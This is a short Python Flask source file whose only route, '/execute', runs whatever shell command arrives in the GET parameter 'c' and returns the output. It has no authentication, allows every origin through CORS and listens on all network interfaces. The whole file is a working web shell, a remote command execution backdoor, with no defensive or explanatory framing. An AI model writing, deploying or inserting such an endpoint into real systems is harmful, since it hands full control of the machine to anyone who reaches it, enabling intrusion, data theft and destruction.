from flask import Flask, request
import subprocess
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # This will allow all domains by default

@app.route('/execute', methods=['GET'])
def execute_command():
    command = request.args.get('c')
    if command:
        output = subprocess.getoutput(command)
        return "<pre>" + output + "</pre>"
    else:
        return "No command provided."


app.run(host='0.0.0.0', port=5000)